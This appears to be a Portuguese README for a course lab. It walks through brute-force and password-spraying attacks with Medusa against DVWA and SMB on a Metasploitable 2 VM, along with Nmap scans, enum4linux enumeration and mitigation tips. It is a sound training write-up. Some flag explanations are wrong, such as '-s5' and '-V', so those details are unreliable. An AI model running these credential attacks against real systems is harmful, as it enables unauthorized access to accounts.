# Desafio Kali Linux Medusa - Ataques de Força Bruta

---

## 1. Introdução

Este repositório documenta o desafio prático do curso na [DIO](https://digitalinnovation.one) onde testei pessoalmente técnicas de segurança ofensiva utilizando Kali Linux e Medusa. Além disso, explorei comandos fundamentais do Nmap para mapeamento de portas e análise de serviços.

Durante o curso, utilizei comandos do Nmap como:

```
sudo nmap -V -sU 10.0.2.15 -p 21,11,23,445,3306
nmap -V -s5 -Pn --open 127.0.0.1/8
```

O que cada tag faz:

- `sudo`: privilégios administrativos para escaneamento de portas UDP.
- `-V`: exibe versão do Nmap no início.
- `-sU`: scan UDP.
- `-p`: especifica portas a serem escaneadas (FTP, Systat, Telnet, SMB, MySQL).
- `-s5`: scan TCP SYN stealth para evitar detecção.
- `-Pn`: assume todos hosts online (sem ping).
- `--open`: mostra somente portas abertas.

Essas técnicas auxiliaram a mapear ambientes de teste antes dos ataques.

---

## 2. Objetivos do Projeto

- Simular ataques de força bruta em serviços FTP, web (DVWA) e SMB.
- Configurar ambiente com duas máquinas virtuais no VirtualBox.
- Documentar comandos, resultados e recomendações.
- Construir portfólio técnico prático e completo.

---

## 3. Estrutura do Repositório

- `README.md` – esta documentação     
- `images/` – prints das etapas do projeto  

---

## 4. Instalação e Configuração do Ambiente

### 4.1 VirtualBox

Instalei o VirtualBox via site oficial e segui o assistente padrão para instalação.

### 4.2 Kali Linux

Baixei a ISO oficial, criei VM com 2GB RAM e 20GB disco, e instalei seguindo assistente.

### 4.3 Metasploitable 2

Extraí arquivo `.vmdk`, criei VM configurada como Ubuntu 32 bits com 512MB RAM, configurei rede Host-only e iniciei o sistema com usuário e senha padrão: `msfadmin/msfadmin`.

---

## 5. Descoberta do IP do Alvo

No terminal do Metasploitable 2 executei:

```
ifconfig
```

Identifiquei o IP da interface `eth0` como **192.168.56.101**. Este IP foi utilizado como padrão em todos os testes seguintes.

Confirmei a comunicação da Kali Linux com o comando:

```
ping 192.168.56.101
```

---

## 6. Testes Práticos e Automação

### 6.1 Preparação das Listas de Usuários e Senhas

Criei arquivos com usuários e senhas para autenticação e força bruta:

```
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### 6.2 Ataque de Força Bruta no Formulário Web DVWA

Acessei `http://192.168.56.101/dvwa/login.php` no navegador.

Executei Medusa para ataque no formulário de login:

```
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=login failed' -t 6
```

O que cada tag faz:

- `-M http`: usa módulo para ataques HTTP.
- `-m PAGE` e `-m FORM`: define a página e os parâmetros de envio do formulário substituindo `^USER^` e `^PASS^`.
- `-m 'FAIL='`: identifica falhas no login para continuar tentativas.
- `-t 6`: paraleliza 6 threads para acelerar o ataque.

### 6.3 Enumeração SMB com enum4linux

Utilizei o enum4linux para coletar informações SMB:

```
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```

Analisei o arquivo gerado com:

```
less enum4_output.txt
```

### 6.4 Ataque Password Spraying no SMB

Criei listas para usuários e senhas do SMB:

```
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

Executei Medusa no SMB:

```
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

### 6.5 Teste com smbclient

Para listar compartilhamentos SMB:

```
smbclient -L //192.168.56.101 -U msfadmin
```

Senha usada: `msfadmin`.

Esta etapa confirmou os compartilhamentos ativos no servidor.

---

## 7. Recomendações de Mitigação

Para evitar ataques como os testados, recomendo:

- Bloquear contas após múltiplas tentativas falhas.  
- Implementar autenticação multifator.  
- Monitorar logs constantemente para detectar atividades suspeitas.  
- Manter sistemas atualizados com as últimas correções de segurança.  

---

## 8. Considerações Finais

Testar essas técnicas reforçou meu entendimento sobre ataques de força bruta, enumeração SMB e automação com Medusa, além de aprimorar minha capacidade de documentar processos técnicos.

É fundamental aprender continuamente sobre cibersegurança, pois o cenário de ameaças está em constante evolução. Novas ferramentas, técnicas e recursos surgem a todo momento, e precisamos estar preparados para nos defender dessas ameaças em constante transformação.
